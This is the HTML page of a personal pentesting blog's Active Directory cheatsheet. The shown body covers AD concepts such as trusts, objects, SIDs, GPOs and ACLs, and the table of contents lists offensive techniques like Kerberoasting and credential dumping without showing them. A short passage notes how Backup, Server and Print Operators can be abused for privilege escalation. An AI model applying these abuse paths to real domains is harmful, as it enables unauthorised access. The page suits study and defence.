
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Concepts Active Directory is a centralized directory service used to manage Windows networks. It stores information about objects on the network and make it easy to configure what is needed. Domain Controllers A domain controller is a server with the AD DS server role: Hosts a copy of the AD …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Active Directory Cheatsheet"/>
  <meta property="og:description" content="Concepts Active Directory is a centralized directory service used to manage Windows networks. It stores information about objects on the network and make it easy to configure what is needed. Domain Controllers A domain controller is a server with the AD DS server role: Hosts a copy of the AD …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
  <meta property="article:section" content="Cheatsheet"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Active Directory Cheatsheet</title>


</head>
<body >

<aside>
  <div>
    <a href="https://ojack69.github.io/jacks-corner/">
      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="https://ojack69.github.io/jacks-corner/">Home</a>

  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="ad/cheatsheet">Active Directory Cheatsheet</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#concepts" title="Concepts">Concepts</a><ul><li><a class="toc-href" href="#domain-controllers" title="Domain Controllers">Domain Controllers</a></li><li><a class="toc-href" href="#ad-ds-data-store" title="AD DS Data Store">AD DS Data Store</a></li><li><a class="toc-href" href="#ad-ds-schema" title="AD DS Schema">AD DS Schema</a></li><li><a class="toc-href" href="#domains" title="Domains">Domains</a></li><li><a class="toc-href" href="#trees" title="Trees">Trees</a></li><li><a class="toc-href" href="#forests" title="Forests">Forests</a></li><li><a class="toc-href" href="#organizational-units-ous" title="Organizational Units (OUs)">Organizational Units (OUs)</a></li><li><a class="toc-href" href="#trusts" title="Trusts">Trusts</a></li><li><a class="toc-href" href="#objects" title="Objects">Objects</a><ul><li><a class="toc-href" href="#protected-account-and-groups" title="Protected Account and Groups">Protected Account and Groups</a></li></ul></li><li><a class="toc-href" href="#group-policy-objects-gpo_1" title="Group Policy Objects (GPO)">Group Policy Objects (GPO)</a></li><li><a class="toc-href" href="#access-control-lists" title="Access Control Lists">Access Control Lists</a></li><li><a class="toc-href" href="#kerberos-authentication" title="Kerberos Authentication">Kerberos Authentication</a><ul><li><a class="toc-href" href="#service-principal-name-spn" title="Service Principal Name (SPN)">Service Principal Name (SPN)</a></li></ul></li><li><a class="toc-href" href="#netntlm-authentication_1" title="NetNTLM Authentication">NetNTLM Authentication</a><ul><li><a class="toc-href" href="#lm-vs-ntlm-vs-net-ntlmv1-vs-net-ntlmv2" title="LM vs NTLM vs Net-NTLMv1 vs Net-NTLMv2">LM vs NTLM vs Net-NTLMv1 vs Net-NTLMv2</a></li><li><a class="toc-href" href="#authentication-flow" title="Authentication Flow">Authentication Flow</a></li></ul></li><li><a class="toc-href" href="#lsass-process_1" title="LSASS Process">LSASS Process</a></li></ul></li><li><a class="toc-href" href="#initial-attack-vectors_1" title="Initial Attack Vectors">Initial Attack Vectors</a><ul><li><a class="toc-href" href="#password-spraying" title="Password Spraying">Password Spraying</a></li><li><a class="toc-href" href="#llmnrnbt-ns-poisoning" title="LLMNR/NBT-NS Poisoning">LLMNR/NBT-NS Poisoning</a><ul><li><a class="toc-href" href="#mitigations" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#relay-attacks_1" title="Relay Attacks">Relay Attacks</a><ul><li><a class="toc-href" href="#smb-relay" title="SMB Relay">SMB Relay</a></li><li><a class="toc-href" href="#drop-the-mic" title="Drop-the-mic">Drop-the-mic</a></li><li><a class="toc-href" href="#mitigations_1" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#dns-takeover-via-ipv6_1" title="DNS takeover via IPv6">DNS takeover via IPv6</a><ul><li><a class="toc-href" href="#mitigations_2" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#ldap-pass-back_1" title="LDAP Pass-back">LDAP Pass-back</a></li><li><a class="toc-href" href="#pxe-boot-image-retrieval" title="PXE Boot Image Retrieval">PXE Boot Image Retrieval</a><ul><li><a class="toc-href" href="#mitigations_3" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#group-policy-preferences-gpp_1" title="Group Policy Preferences - GPP">Group Policy Preferences - GPP</a></li><li><a class="toc-href" href="#local-administrator-password-solution-laps" title="Local Administrator Password Solution (LAPS)">Local Administrator Password Solution (LAPS)</a></li><li><a class="toc-href" href="#mssql-ntlm-hash-dump" title="MSSQL NTLM hash dump">MSSQL NTLM hash dump</a></li></ul></li><li><a class="toc-href" href="#enumeration_1" title="Enumeration">Enumeration</a><ul><li><a class="toc-href" href="#network-credentials-injection" title="Network Credentials Injection">Network Credentials Injection</a><ul><li><a class="toc-href" href="#force-ntlm-authentication-over-kerberos" title="Force NTLM Authentication over Kerberos">Force NTLM Authentication over Kerberos</a></li></ul></li><li><a class="toc-href" href="#sysvol_1" title="SYSVOL">SYSVOL</a></li><li><a class="toc-href" href="#dns-enumeration" title="DNS Enumeration">DNS Enumeration</a></li><li><a class="toc-href" href="#command-line-powershell-enumeration" title="Command Line &amp; Powershell Enumeration">Command Line &amp; Powershell Enumeration</a><ul><li><a class="toc-href" href="#command-line-enumeration" title="Command Line Enumeration">Command Line Enumeration</a></li><li><a class="toc-href" href="#powershell-enumeration" title="Powershell Enumeration">Powershell Enumeration</a></li><li><a class="toc-href" href="#using-net-classes" title="Using .NET classes">Using .NET classes</a></li><li><a class="toc-href" href="#wmi-enumeration" title="WMI Enumeration">WMI Enumeration</a></li></ul></li><li><a class="toc-href" href="#linux-enumeration_1" title="Linux Enumeration">Linux Enumeration</a></li><li><a class="toc-href" href="#external-enumeration" title="External Enumeration">External Enumeration</a></li><li><a class="toc-href" href="#bloodhoundsharphound" title="BloodHound/Sharphound">BloodHound/Sharphound</a><ul><li><a class="toc-href" href="#interesting-bloodhound-queries" title="Interesting BloodHound Queries">Interesting BloodHound Queries</a></li></ul></li><li><a class="toc-href" href="#hints_1" title="Hints">Hints</a></li><li><a class="toc-href" href="#defense" title="Defense">Defense</a></li></ul></li><li><a class="toc-href" href="#lateral-movements_1" title="Lateral Movements">Lateral Movements</a><ul><li><a class="toc-href" href="#pivoting" title="Pivoting">Pivoting</a></li><li><a class="toc-href" href="#pass-the-attacks" title="Pass-the-* attacks">Pass-the-* attacks</a><ul><li><a class="toc-href" href="#mitigations_4" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#token-impersonation_1" title="Token Impersonation">Token Impersonation</a><ul><li><a class="toc-href" href="#token-impersonation-metasploit" title="Token Impersonation: Metasploit">Token Impersonation: Metasploit</a></li><li><a class="toc-href" href="#token-impersonation-mimikatz" title="Token Impersonation: Mimikatz">Token Impersonation: Mimikatz</a></li><li><a class="toc-href" href="#mitigations_5" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#kerberoasting_1" title="Kerberoasting">Kerberoasting</a><ul><li><a class="toc-href" href="#mitigations_6" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#as-rep-roasting_1" title="AS-REP Roasting">AS-REP Roasting</a></li><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a><ul><li><a class="toc-href" href="#dumping-credentials-sam" title="Dumping Credentials - SAM">Dumping Credentials - SAM</a></li><li><a class="toc-href" href="#dumping-credentials-ntds" title="Dumping Credentials - NTDS">Dumping Credentials - NTDS</a></li><li><a class="toc-href" href="#dumping-credentials-lsass" title="Dumping Credentials - LSASS">Dumping Credentials - LSASS</a></li><li><a class="toc-href" href="#dumping-credentials-secrets" title="Dumping Credentials - Secrets">Dumping Credentials - Secrets</a></li><li><a class="toc-href" href="#dumping-credentials-wdigest" title="Dumping Credentials - WDigest">Dumping Credentials - WDigest</a></li><li><a class="toc-href" href="#dumping-credentials-dcsync" title="Dumping Credentials - DCSync">Dumping Credentials - DCSync</a></li><li><a class="toc-href" href="#dumping-credentials-kerberos-tickets-and-keys" title="Dumping Credentials - Kerberos Tickets and Keys">Dumping Credentials - Kerberos Tickets and Keys</a></li><li><a class="toc-href" href="#dumping-credentials-windows-credentials-manager" title="Dumping Credentials - Windows Credentials Manager">Dumping Credentials - Windows Credentials Manager</a></li><li><a class="toc-href" href="#dumping-credentials-keytab" title="Dumping Credentials - Keytab">Dumping Credentials - Keytab</a></li><li><a class="toc-href" href="#dumping-credentials-linux" title="Dumping Credentials - Linux">Dumping Credentials - Linux</a></li></ul></li><li><a class="toc-href" href="#kerberos-delegation_1" title="Kerberos Delegation">Kerberos Delegation</a><ul><li><a class="toc-href" href="#unconstrained-delegation" title="Unconstrained Delegation">Unconstrained Delegation</a><ul><li><a class="toc-href" href="#coerced-authentications" title="Coerced Authentications">Coerced Authentications</a></li></ul></li><li><a class="toc-href" href="#constrained-delegation_1" title="Constrained Delegation">Constrained Delegation</a></li><li><a class="toc-href" href="#resource-based-constrained-delegation-rbcd" title="Resource-Based Constrained Delegation (RBCD)">Resource-Based Constrained Delegation (RBCD)</a></li><li><a class="toc-href" href="#mitigations_7" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#samaccountname-nopac_1" title="sAMAccountName (nopac)">sAMAccountName (nopac)</a><ul><li><a class="toc-href" href="#samaaccountname-spoofing-abusing-a-machine-account" title="sAMAaccountName Spoofing - Abusing a Machine Account">sAMAaccountName Spoofing - Abusing a Machine Account</a></li><li><a class="toc-href" href="#samaaccountname-spoofing-abusing-a-user-account" title="sAMAaccountName Spoofing - Abusing a User Account">sAMAaccountName Spoofing - Abusing a User Account</a></li></ul></li><li><a class="toc-href" href="#printnightmare-cve-2021-34527_1" title="PrintNightmare (CVE-2021-34527)">PrintNightmare (CVE-2021-34527)</a></li><li><a class="toc-href" href="#dnsadmins" title="DNSAdmins">DNSAdmins</a></li><li><a class="toc-href" href="#mssql-server" title="MSSQL Server">MSSQL Server</a></li><li><a class="toc-href" href="#windows-management-instrumentation-wmi" title="Windows Management Instrumentation (WMI)">Windows Management Instrumentation (WMI)</a></li><li><a class="toc-href" href="#powershell-remoting" title="PowerShell Remoting">PowerShell Remoting</a><ul><li><a class="toc-href" href="#constrained-language-mode-bypasses" title="Constrained Language Mode Bypasses">Constrained Language Mode Bypasses</a></li></ul></li><li><a class="toc-href" href="#defense_2" title="Defense">Defense</a></li></ul></li><li><a class="toc-href" href="#post-exploitation-persistence_1" title="Post Exploitation &amp; Persistence">Post Exploitation &amp; Persistence</a><ul><li><a class="toc-href" href="#local-privilege-escalation" title="Local Privilege Escalation">Local Privilege Escalation</a><ul><li><a class="toc-href" href="#krbrelayup" title="KrbRelayUp">KrbRelayUp</a></li></ul></li><li><a class="toc-href" href="#golden-silver-tickets_1" title="Golden &amp; Silver Tickets">Golden &amp; Silver Tickets</a></li><li><a class="toc-href" href="#skeleton-key" title="Skeleton Key">Skeleton Key</a><ul><li><a class="toc-href" href="#mitigations_8" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#abusing-trusts_1" title="Abusing Trusts">Abusing Trusts</a><ul><li><a class="toc-href" href="#trust-across-domains" title="Trust across domains">Trust across domains</a></li><li><a class="toc-href" href="#trust-across-forest" title="Trust across forest">Trust across forest</a></li><li><a class="toc-href" href="#mssql-database-links" title="MSSQL Database Links">MSSQL Database Links</a></li><li><a class="toc-href" href="#mitigations_9" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#directory-services-restore-mode-dsrm_1" title="Directory Services Restore Mode (DSRM)">Directory Services Restore Mode (DSRM)</a></li><li><a class="toc-href" href="#security-support-provider-ssp" title="Security Support Provider (SSP)">Security Support Provider (SSP)</a></li><li><a class="toc-href" href="#acls-attack" title="ACLs Attack">ACLs Attack</a><ul><li><a class="toc-href" href="#permission-delegation" title="Permission Delegation">Permission Delegation</a></li><li><a class="toc-href" href="#adminsdholder" title="AdminSDHolder">AdminSDHolder</a></li><li><a class="toc-href" href="#mitigations_10" title="Mitigations">Mitigations</a></li></ul></li><li><a class="toc-href" href="#sidhistory_1" title="SIDHistory">SIDHistory</a></li><li><a class="toc-href" href="#security-descriptors" title="Security Descriptors">Security Descriptors</a><ul><li><a class="toc-href" href="#security-descriptors-wmi" title="Security Descriptors - WMI">Security Descriptors - WMI</a></li><li><a class="toc-href" href="#security-descriptors-powershell-remoting" title="Security Descriptors - PowerShell Remoting">Security Descriptors - PowerShell Remoting</a></li><li><a class="toc-href" href="#security-descriptors-remote-registry" title="Security Descriptors - Remote Registry">Security Descriptors - Remote Registry</a></li></ul></li><li><a class="toc-href" href="#active-directory-certificate-services-ad-cs_1" title="Active Directory Certificate Services (AD CS)">Active Directory Certificate Services (AD CS)</a><ul><li><a class="toc-href" href="#misconfigured-certificate-templates-esc1" title="Misconfigured Certificate Templates &mdash; ESC1">Misconfigured Certificate Templates &mdash; ESC1</a></li><li><a class="toc-href" href="#misconfigured-certificate-templates-esc2" title="Misconfigured Certificate Templates &mdash; ESC2">Misconfigured Certificate Templates &mdash; ESC2</a></li><li><a class="toc-href" href="#misconfigured-enrollment-agent-templates-esc3" title="Misconfigured Enrollment Agent Templates - ESC3">Misconfigured Enrollment Agent Templates - ESC3</a></li><li><a class="toc-href" href="#vulnerable-certificate-template-access-control-esc4" title="Vulnerable Certificate Template Access Control - ESC4">Vulnerable Certificate Template Access Control - ESC4</a></li><li><a class="toc-href" href="#vulnerable-pki-object-access-control-esc5" title="Vulnerable PKI Object Access Control - ESC5">Vulnerable PKI Object Access Control - ESC5</a></li><li><a class="toc-href" href="#editf_attributesubjectaltname2-esc6" title="EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6">EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6</a></li><li><a class="toc-href" href="#vulnerable-certificate-authority-access-control-esc7" title="Vulnerable Certificate Authority Access Control - ESC7">Vulnerable Certificate Authority Access Control - ESC7</a></li><li><a class="toc-href" href="#ntlm-relay-to-ad-cs-http-endpoints-esc8" title="NTLM Relay to AD CS HTTP Endpoints &ndash; ESC8">NTLM Relay to AD CS HTTP Endpoints &ndash; ESC8</a></li><li><a class="toc-href" href="#certificate-mapping" title="Certificate Mapping">Certificate Mapping</a><ul><li><a class="toc-href" href="#cve-2022-26923-certifried" title="CVE-2022&ndash;26923 - Certifried">CVE-2022&ndash;26923 - Certifried</a></li><li><a class="toc-href" href="#no-security-extension-esc9" title="No Security Extension - ESC9">No Security Extension - ESC9</a></li><li><a class="toc-href" href="#weak-certificate-mapping-esc10" title="Weak certificate mapping - ESC10">Weak certificate mapping - ESC10</a></li></ul></li><li><a class="toc-href" href="#ntlm-relay-to-ad-cs-rdp-endpoints-esc11_1" title="NTLM Relay to AD CS RDP Endpoints &ndash; ESC11">NTLM Relay to AD CS RDP Endpoints &ndash; ESC11</a></li><li><a class="toc-href" href="#forging-certificates-with-stolen-ca-certificates-dpersist1-golden-certificate" title="Forging Certificates with Stolen CA Certificates - DPERSIST1 (Golden Certificate)">Forging Certificates with Stolen CA Certificates - DPERSIST1 (Golden Certificate)</a></li><li><a class="toc-href" href="#trusting-rogue-ca-certificates-dpersist2" title="Trusting Rogue CA Certificates - DPERSIST2">Trusting Rogue CA Certificates - DPERSIST2</a></li><li><a class="toc-href" href="#malicious-misconfiguration-dpersist3" title="Malicious Misconfiguration - DPERSIST3">Malicious Misconfiguration - DPERSIST3</a></li><li><a class="toc-href" href="#shadow-credential" title="Shadow Credential">Shadow Credential</a></li></ul></li><li><a class="toc-href" href="#group-nesting_1" title="Group Nesting">Group Nesting</a></li><li><a class="toc-href" href="#gpo-persistence" title="GPO Persistence">GPO Persistence</a></li><li><a class="toc-href" href="#dcshadow" title="DCShadow">DCShadow</a></li><li><a class="toc-href" href="#backdoors" title="Backdoors">Backdoors</a></li></ul></li><li><a class="toc-href" href="#evasion_1" title="Evasion">Evasion</a></li><li><a class="toc-href" href="#monitoring" title="Monitoring">Monitoring</a></li><li><a class="toc-href" href="#misc" title="Misc">Misc</a><ul><li><a class="toc-href" href="#clock-skew" title="Clock Skew">Clock Skew</a></li><li><a class="toc-href" href="#dlls" title="DLLs">DLLs</a></li></ul></li></ul></div>
        </div>
    <h2 id="concepts">Concepts</h2>
<p>Active Directory is a centralized directory service used to manage Windows networks. It stores information about objects on the network and make it easy to configure what is needed.</p>
<h3 id="domain-controllers">Domain Controllers</h3>
<p>A domain controller is a server with the AD DS server role:</p>
<ul>
<li>Hosts a copy of the <strong>AD DS Data Store</strong></li>
<li>Provides authentication and authorization services</li>
<li>Replicates updates to other domain controllers in the <strong>domain</strong> or <strong>forest</strong></li>
<li>Allows administrative access to manage user accounts and network resources</li>
</ul>
<h3 id="ad-ds-data-store">AD DS Data Store</h3>
<p>The <strong>AD DS Data Store</strong> contains the database files and processes that store and manage information for users, services and applications such as users, objects, groups, password hashes, etc.:</p>
<ul>
<li>Consists into the <code>Ntds.dit</code> file</li>
<li>It's stored by default in the <code>%SystemRoot%\NTDS</code> folder on all domain controllers </li>
<li>Is accessible only through domain controller processes and protocols or Administrator users</li>
</ul>
<h3 id="ad-ds-schema">AD DS Schema</h3>
<p>The AD DS Schema defines every type of object that can be stored in the AD and enforces rules regarding object creation and configuration.</p>
<h3 id="domains">Domains</h3>
<p>Domains are used to group and manage object in an organization:</p>
<ul>
<li>Defines an administrative boundary for applying policies to group of objects.</li>
<li>Defines a replication boundary for replication data between domain controllers.</li>
<li>Defines an authentication and authorization boundary that provides a way to limit the scope of access to resources.</li>
</ul>
<h3 id="trees">Trees</h3>
<p>Trees are a group of domains organized in a hierarchy, identifying parent and child domain. All domains in the tree:</p>
<ul>
<li>Share the namespace with the parent domain.</li>
<li>Can have additional child domains.</li>
<li>By default, they create a *<em>two-way transitive trust with other domains</em>.</li>
</ul>
<h3 id="forests">Forests</h3>
<p>A forest is a collection of one or more domain trees:</p>
<ul>
<li>Forests share a common schema.</li>
<li>Forests share a common configuration partition.</li>
<li>Forests share a common <strong>Global Catalog (GC)</strong> to enable searching.</li>
<li>Forests <strong>enable trusts between all the domains in the forest</strong>.</li>
<li>Forests share the Enterprise Admins and Schema Admins groups.</li>
</ul>
<p>The <strong>Global Catalog</strong> is a feature of Active Directory (AD) that allows a domain controller (DC) to provide information on any object in the forest, It's used to locate objects outside its domain is beyond its scope.</p>
<ul>
<li>Domain controllers with the global catalog feature enabled are referred to as <strong>global catalog servers</strong>.</li>
</ul>
<h3 id="organizational-units-ous">Organizational Units (OUs)</h3>
<p>Organizational Units are containers defined in a domain for users, groups, computers and other OUs. They're used to:</p>
<ul>
<li>Represent an organization hierarchically and logically.</li>
<li>Manage a collection of objects in a consistent way.</li>
<li>Delegate permissions to administer groups of objects.</li>
<li>Apply Policies.</li>
</ul>
<h3 id="trusts">Trusts</h3>
<p>Trusts provide a mechanism for user to gain access to resources in another domain. </p>
<p>There are two type of trusts:</p>
<ul>
<li><strong>Directional</strong>: The trust direction flows from a <em>trusting domain</em> A to a <em>trusted domain</em> B. A trusts B and B can access A's resources (<strong>One-way trust</strong>). The trust can also be bi-directional (<strong>Two-way-trust</strong>) i.e. B trusts A and A can access B's resources. </li>
<li><strong>Transitive</strong>: The trust relationship is extended to include other trusted domain beyond a two-domain trust. If a domain B trusts A and C trusts B, then C trusts A.<ul>
<li>It's possible to define <strong>Shortcut Trusts</strong>, a direct trust between two domain that are transitively trusting each other via many other domains transitive trusts relationships to reduce access times in complex trust scenarios.</li>
</ul>
</li>
</ul>
<p><img alt="ad-trust-relations.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/ad-trust-relations.png"/></p>
<p>Trust can be <strong>automatic</strong> in the same forest:</p>
<ul>
<li>All parent-child domains trust each other (is always two-way transitive).</li>
<li>All domains in a forest trust all other domains in the forest (is always two-way transitive).</li>
</ul>
<p>Instead, trusts across forests boundaries need to be explicitly established with <strong>External Trusts</strong> between two domains in different forests, when forests don't have a trust relationship:</p>
<ul>
<li>Can be one-way or two-way and is nontransitive.</li>
</ul>
<p>It's possible to establish trusts between two forests (their root domains) with a <strong>Forest Trust</strong>:</p>
<ul>
<li>Can only be created between two forests and can't be implicitly extended to a third forest-</li>
<li>Can be one-way or two-way and transitive (<strong>domain-to-domain, not forest-to-forest!</strong>) or nontransitive.</li>
</ul>
<p><img alt="ad-forest-trusts.png" src="https://ojack69.github.io/jacks-corner/images/ad/active-directory/ad-forest-trusts.png"/></p>
<p>Trust relationships i represented by a <strong>Trusted Domain Objects (TDOs)</strong> in a domain.</p>
<h3 id="objects">Objects</h3>
<p>An object is anything that can be present in an OU or domain:</p>
<ul>
<li><strong>User</strong>: enables network resource access for a user. Users are alos known as <strong>security principals</strong>, meaning that they can be authenticated by the domain and can be assigned privileges over <strong>resources</strong> like files or printers. Generally, a security principal is an object that can act upon resources in the network. <strong>Users can be people or services</strong>.</li>
<li><strong>InetOrgPerson</strong>: similar to a user account; used for compatibility with other directory services.</li>
<li><strong>Contacts</strong>: used to assign e-mail addresses to external users. Does not provide network access.</li>
<li><strong>Security Groups</strong>: used to simplify administration of access control. Security Groups are also considered security principals and, therefore, can have privileges over resources on the network. <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">Reference to existing groups</a>*. <strong>Groups can be member of other groups</strong>.</li>
<li><strong>Computers</strong>: enable authentication and auditing of computer access to resources. Machines are also considered "security principals" and are assigned an account just as any regular user. This account has somewhat limited rights within the domain itself. The machine accounts themselves are <strong>local administrators</strong> on the assigned computer, they are generally not supposed to be accessed by anyone except the computer itself, but as with any other account, if you have the password, you can use it to log in.<ul>
<li>Machine Account passwords are automatically rotated out and are generally comprised of 120 random characters.</li>
<li>They follow a specific naming scheme: the machine account name is the computer's name followed by a dollar sign (ex: for a machine named <em>DC01</em> there's the account <em>DC01$</em>). </li>
</ul>
</li>
<li><strong>Printers</strong>: used to simplify the process of locating and connecting to printers.</li>
<li><strong>Shared Folders</strong>: enables users to search for a shared folders based on properties.</li>
</ul>
<p>Each object has a SID which uniquely identifies it in the domain; the SID is generally structured as follows:</p>
<ul>
<li><code>S-&lt;Revision level&gt;-&lt;Domain Identifier&gt;-&lt;Object ID (Relative Identifier)&gt;</code></li>
</ul>
<p>Built-in object can be found <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers#well-known-sids">here</a>.</p>
<p><strong>Note</strong>: the difference between OUs and security groups is that the first are used to <strong>apply policies to users and computers</strong> whilst the latter is used to <strong>grant permissions over resources</strong>. A user or computer can belong to only one OU at a time whilst can be part of many security groups.</p>
<h4 id="protected-account-and-groups">Protected Account and Groups</h4>
<p><strong>Protected accounts and groups</strong> are special objects where permissions are set and enforced via an automatic process that ensures the permissions on the objects remain consistent. These permissions remain even if you move the objects to different locations in Active Directory. If a protected object's permissions are modified, existing processes ensure that permissions are returned to their defaults quickly.</p>
<p>The following security accounts and groups are protected in Active Directory Domain Services:</p>
<ul>
<li>Account Operators</li>
<li>Administrator</li>
<li>Administrators</li>
<li>Backup Operators</li>
<li>Domain Admins</li>
<li>Domain Controllers</li>
<li>Enterprise Admins</li>
<li>Enterprise Key Admins</li>
<li>Key Admins</li>
<li>Krbtgt</li>
<li>Print Operators</li>
<li>Read-only Domain Controllers</li>
<li>Replicator</li>
<li>Schema Admins</li>
<li>Server Operators</li>
</ul>
<p>Following some Protected Groups, besides <em>Domain Admins</em>, <em>Enterprise Admin</em> and <em>Built-in Admins</em>, that are generally targeted due their capabilities:</p>
<ul>
<li><strong>Account Operators</strong>: <strong>cannot</strong> modify the membership for <em>Domain Admins</em>, <em>Enterprise Admin</em> and <em>Built-in Admins</em> but <strong>can</strong> modify the membership of nested group within these.</li>
<li><strong>Backup Operators</strong>: can backup a GPO, edit it in order to add SID of a controlled account to a privileged group and then restore to apply the updates.</li>
<li><strong>Server Oeprators</strong>: can run a command as system (using the disabled Browser service)</li>
<li><strong>Print Operators</strong>: can copy <code>Ntds.dit</code> backup, load device drivers.</li>
</ul>
<p>See <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#adminsdholder">AdminSDHolder</a>.</p>
<h3 id="group-policy-objects-gpo_1">Group Policy Objects (GPO)</h3>
<p><strong>Group Policy Objects (GPO)</strong> are a collection of settings that can be applied to OUs. GPOs can contain policies aimed at either users or computers.</p>
<p>GPOs are distributed to the network via a network share called <code>SYSVOL</code>, stored in the DC.
All users in a domain should typically have access to this share over the network to sync their GPOs periodically. The SYSVOL share points by default to the <code>C:\Windows\SYSVOL\sysvol\</code> directory on each of the DCs in our network.</p>
<p>Once a change has been made to any GPOs, it might take up to 2 hours for computers to catch up. Alternatively, it's possible to force the sync with the following command:</p>
<div class="highlight"><pre><span></span><code><span class="n">gpupdate</span> <span class="p">/</span><span class="n">force</span>
</code></pre></div>
<p>In GPO can be set a <strong>restricted group</strong>; these allow an administrator to define the following two properties for security-sensitive (restricted) groups:</p>
<ul>
<li><strong>Members</strong>: defines who should and shouldn't belong to the restricted group.</li>
<li><strong>Member Of</strong>: specifies which other groups the restricted group should belong to.</li>
</ul>
<p>Restricted groups are used to manage local group memberships of Windows workstations and servers from on a central way.</p>
<h3 id="access-control-lists">Access Control Lists</h3>
<p>In the access control model used by AD there are two main entities:</p>
<ul>
<li><strong>Access Tokens</strong>: defines the security context for a process; contains the identity of its principal (a user or a group) and privileges associated to that principal.</li>
<li><strong>Security Descriptors</strong>: are data structure associated  ton an AD object that define its access control. It contains: <ul>
<li>the SID of the object owner.</li>
<li>a <strong>Discretionary ACL (DACL)</strong> containing the list of permissions that an access token must have to access the object.</li>
<li>a <strong>System ACL (SACL)</strong> that allows administrators to log attempts to access a secured object, defining the audit policy for that object.</li>
</ul>
</li>
</ul>
